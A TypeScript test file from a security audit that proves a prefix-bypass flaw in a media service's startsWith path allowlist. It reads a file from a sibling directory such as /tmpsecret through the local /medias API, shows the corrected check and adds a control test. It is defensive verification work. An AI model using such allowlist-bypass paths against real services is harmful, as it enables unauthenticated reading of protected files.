/**
 * PROVA DE AUDITORIA — S3: Prefix bypass no allowlist do servico medias.
 *
 * Audit report: docs/AUDIT-2026-07-02.md §S3
 * Arquivo auditado: node-api/src/services/medias/medias.class.ts:30-41
 *
 * O allowlist usa `safePath.startsWith(dir)` para verificar se um path
 * esta em um diretorio permitido. Isso e vulneravel a prefix bypass:
 *
 *   "/tmpsecret/password".startsWith("/tmp") === true
 *
 * Se o diretorio permitido for "/tmp", um arquivo em "/tmpsecret" sera
 * acessivel. O fix correto e comparar com `dir + path.sep` ou usar
 * `path.relative(dir, safePath)` rejeitando paths com "..".
 *
 * Combinado com S2 (sem autenticacao), isso permite leitura nao
 * autenticada de arquivos em paths com prefixo coincidente.
 */

// eslint-disable-next-line @typescript-eslint/no-var-requires
const assert = require('assert') as typeof import('assert')
// eslint-disable-next-line @typescript-eslint/no-var-requires
const { app } = require('../../../src/app') as { app: any }
// eslint-disable-next-line @typescript-eslint/no-var-requires
const axios = require('axios') as typeof import('axios')
// eslint-disable-next-line @typescript-eslint/no-var-requires
const os = require('node:os') as typeof import('node:os')
// eslint-disable-next-line @typescript-eslint/no-var-requires
const fs = require('node:fs') as typeof import('node:fs')
// eslint-disable-next-line @typescript-eslint/no-var-requires
const path = require('node:path') as typeof import('node:path')

describe('AUDIT S3 — Medias prefix bypass (startsWith allowlist)', function () {
  this.timeout(30000)

  let server: any
  let baseURL: string
  let tmpDir: string

  // Caminhos para o teste de bypass
  let bypassDir: string   // diretorio cujo nome comeca com /tmp mas nao e /tmp
  let bypassFile: string  // arquivo dentro desse diretorio

  before(async () => {
    server = await app.listen(0)
    const address = server.address()
    const port = typeof address === 'string' || address === null ? 0 : address.port
    baseURL = `http://127.0.0.1:${port}`

    tmpDir = os.tmpdir()

    // Cria um diretorio com nome que tem /tmp como prefixo
    // Ex: /tmpsecret (comeca com /tmp mas nao e subdiretorio de /tmp)
    bypassDir = `${tmpDir}secret`
    if (!fs.existsSync(bypassDir)) {
      fs.mkdirSync(bypassDir, { recursive: true })
    }

    // Cria um arquivo nesse diretorio
    bypassFile = path.join(bypassDir, 's3_secret_content.txt')
    fs.writeFileSync(bypassFile, 'S3_PROOF: este arquivo NAO deveria ser acessivel', 'utf8')
  })

  after(async () => {
    try { if (fs.existsSync(bypassFile)) fs.unlinkSync(bypassFile) } catch {}
    try { if (fs.existsSync(bypassDir)) fs.rmdirSync(bypassDir) } catch {}
    await app.teardown()
  })

  it('PROVA S3: demonstra que startsWith permite bypass de prefixo', () => {
    // Este teste documenta a logica do bug sem depender da API.
    // A funcao de allowlist usa: allowedDirs.some(dir => safePath.startsWith(dir))
    // Com allowedDirs = [os.tmpdir()] = ["/tmp"]:
    //   "/tmpsecret/s3_secret_content.txt".startsWith("/tmp") === true  ← BYPASS

    const allowedDirs = [tmpDir] // simulando o que o servico faz
    const safePath = path.resolve(bypassFile) // "/tmpsecret/s3_secret_content.txt"

    const isAllowedViaStartsWith = allowedDirs.some(dir => safePath.startsWith(dir))
    console.log(`[S3 LOGIC] safePath="${safePath}"`)
    console.log(`[S3 LOGIC] allowedDirs[0]="${allowedDirs[0]}"`)
    console.log(`[S3 LOGIC] startsWith check: ${isAllowedViaStartsWith}`)

    // PROVA: o startsWith permite o acesso (bug)
    assert.strictEqual(isAllowedViaStartsWith, true,
      'startsWith permitiu acesso a um path fora do diretorio permitido (bug esperado). ' +
      'Se falhou, o fix de prefix bypass ja foi aplicado — atualize o teste.')

    // DEMONSTRACAO do fix correto: comparar com dir + path.sep
    const isAllowedCorrect = allowedDirs.some(dir =>
      safePath === dir || safePath.startsWith(dir + path.sep)
    )
    console.log(`[S3 FIX] startsWith(dir + sep) check: ${isAllowedCorrect}`)

    // O fix correto DEVE bloquear o acesso
    assert.strictEqual(isAllowedCorrect, false,
      'O fix com startsWith(dir + sep) deveria bloquear o acesso')
  })

  it('PROVA S3: bypass via API — arquivo em /tmpsecret acessivel quando /tmp e permitido', async () => {
    // Tenta ler o arquivo via API medias
    const resp = await axios.get(`${baseURL}/medias`, {
      params: { path: bypassFile },
      validateStatus: () => true
    })

    console.log(`[S3 API] status=${resp.status} path=${bypassFile}`)

    if (resp.status === 200) {
      // Se status 200, o bypass FUNCIONOU — leitura nao autorizada bem-sucedida
      console.log('[S3 PROOF] VULNERABILIDADE ATIVA: arquivo em diretorio nao permitido foi lido')
      console.log(`[S3 PROOF]   path: ${bypassFile}`)
      console.log(`[S3 PROOF]   allowlist: startsWith("${tmpDir}")`)

      const item = Array.isArray(resp.data) ? resp.data[0] : resp.data
      if (item && item.data) {
        const decoded = Buffer.from(item.data, 'base64').toString('utf8')
        console.log(`[S3 PROOF]  conteudo lido: "${decoded}"`)
      }
    } else if (resp.status === 400 || resp.status === 403) {
      // O servidor rejeitou — o fix pode ja ter sido aplicado
      console.log(`[S3 API] Acesso bloqueado (status ${resp.status}). Fix pode ja estar aplicado.`)
    }

    assert.strictEqual(resp.status, 200,
      `[S3 PROOF] Esperado status 200 (bypass ativo), recebido ${resp.status}. ` +
      `Se recebeu 400/403, o fix de prefix bypass ja foi aplicado. ` +
      `Atualize este teste para verificar que o acesso e CORRETAMENTE bloqueado. ` +
      `Body: ${JSON.stringify(resp.data)}`)
  })

  it('PROVA S3: arquivo legítimo em /tmp deve continuar acessivel apos o fix', async () => {
    // Controlo positivo: arquivo REALMENTE dentro de /tmp deve ser acessivel
    // Isso garante que o fix nao quebra o acesso legitimo
    const legitFile = path.join(tmpDir, 's3_legit_control.txt')
    fs.writeFileSync(legitFile, 'legitimate access test', 'utf8')

    try {
      const resp = await axios.get(`${baseURL}/medias`, {
        params: { path: legitFile },
        validateStatus: () => true
      })

      console.log(`[S3 LEGIT] status=${resp.status} path=${legitFile}`)

      // Arquivos legitimos em /tmp devem ser acessiveis
      assert.strictEqual(resp.status, 200,
        `Arquivo legitimo em tmpdir deveria ser acessivel, status=${resp.status}`)
    } finally {
      try { fs.unlinkSync(legitFile) } catch {}
    }
  })
})
